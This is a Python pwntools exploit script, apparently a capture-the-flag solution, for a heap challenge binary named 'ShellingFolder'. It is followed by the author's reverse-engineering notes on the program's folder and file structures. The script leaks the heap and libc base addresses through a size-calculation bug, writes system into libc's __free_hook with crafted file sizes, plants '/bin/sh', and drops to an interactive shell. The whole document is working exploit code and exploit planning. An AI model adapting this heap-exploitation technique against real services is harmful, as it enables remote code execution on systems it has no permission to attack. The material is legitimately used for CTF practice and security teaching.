#!/usr/bin/env python3

from pwn import *

exe = ELF("./ShellingFolder")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    def change_folder(folder):
    	r.sendline("2")
    	r.recvuntil("Choose a Folder :")
    	r.send(folder)

    def create_folder(name):
    	r.sendline("3")
    	r.recvuntil("Name of Folder:")
    	r.send(name) # size 0x1f

    def create_file(name, size):
    	r.sendline("4")
    	r.recvuntil("Name of File:")
    	r.send(name)
    	r.recvuntil("Size of File:")
    	r.sendline(str(size))

    def remove(name):
    	r.sendline("5")
    	r.recvuntil("Choose a Folder or file :")
    	r.send(name)

    def calculate_size():
    	r.sendline("6")


    create_file("A"*0x18 + "\x00", 69)
    calculate_size()
    r.recvuntil("A"*0x18)
    heap = u64(r.recvn(6) + "\x00\x00") - 0x88
    log.info("heap base address: {}".format(hex(heap)))
    
    create_folder("folder1")
    change_folder("folder1")

    create_file("B"*0x18 + "\x00", 69)
    create_file("C"*0x18 + "\x00", 69)

    remove("B"*0x18 + "\x00")
    change_folder("..\x00")
    remove("A"*0x18 + "\x00")
    
    overwrite_with = heap + 0x48
    create_file("C"*0x18 + p64(heap+0x10)[:7], -376)
    calculate_size()
    [r.recvuntil("Your choice:") for i in range(2)]
    calculate_size()

    leak = u64(r.recvuntil(" :")[:6] + "\x00\x00")
    libc.address = leak - 0x3c3b78
    log.info("libc base address: {}".format(hex(libc.address)))
    log.info("__free_hook address: {}".format(hex(libc.symbols['__free_hook'])))
    
    system = libc.symbols['system']
    binsh = u64("/bin/sh\x00")
    create_file("D"*0x18 + p64(libc.symbols['__free_hook'])[:7], system & 0x00000000FFFFFFFF)
    create_file("E"*0x18 + p64(libc.symbols['__free_hook'] + 4)[:7], (system & 0xFFFFFFFF00000000) >> 32)
    
    create_file("delete_me\x00", 69)
    create_file("F"*0x18 + p64(heap+0x370)[:7], binsh & 0x00000000FFFFFFFF)
    create_file("G"*0x18 + p64(heap+0x370 + 4)[:7], (binsh & 0xFFFFFFFF00000000) >> 32)
    
    calculate_size()
    # remove delete_me manually
    
    #gdb.attach(r)
    r.interactive()


if __name__ == "__main__":
    main()
'''

root folder
	- calloc(0x88)
	- +0x50 - DAT_00302018
	- +0x58 - "root"
	- +0x5c - NULL
	- +0x80 - 1

	DAT_00302018 = pvVar2
	DAT_00302020 = DAT_00302018


	we start at root directory???????????????


create_folder
	- calloc(0x88) - non-fastbin size chunk
	- +0x50 - DAT_00302020 // parent directory
	- +0x58 - name - 0x1f
	- +0x78 - 0 - appending NULL at name
	- +0x80 - 1 - cond to determine if file or folder?
	
	

	- put it in a list of folders/files at DAT_00302020 - 10 spots ; if fail return false BUT doesn't free it? 

create_file
	- calloc(0x88)
	- +0x50 - DAT_00302020 // parent directory
	- +0x58 - name - 0x1f
	- +0x78 - size - 8 bytes
	- +0x80 - 0 - cond to determine if file or folder?

	- tries to add it to the list

remove
	- insert name
	- goes through DAT_00302020 until and strcmp every entry 
	- if strcmp = 0; calls function and sets entry to 0

	actual_remove
		- if it is a file, remove it
		- if it is a folder, call actual_remove on all of its files (and possibly folders?)
				- recursive function
				- removes but no zero-ing


change_folder 
	- insert name
	- if ".." - it will take the +0x50 (parent directory)
	- else it searches
	- it it matches and is a folder takes that

list
	- lists all the 0x50/8 10 entries of param_1



calculate_size 
	- goes though the 10 entries
	- custom_copy but doesn't append NULL?
		- if it is folder - *local_20 = *local_20; ?????
		- if file - prints the file and its size, *local_20 += size
		- BUT IT IS NOT REVERTED TO ORIGINAL SIZE 


				can have the same name between files and golders?
				doesn't differientate a lot between files and folders?	


rbp-0x18
rbp-0x30

get libc to get custom copied
'''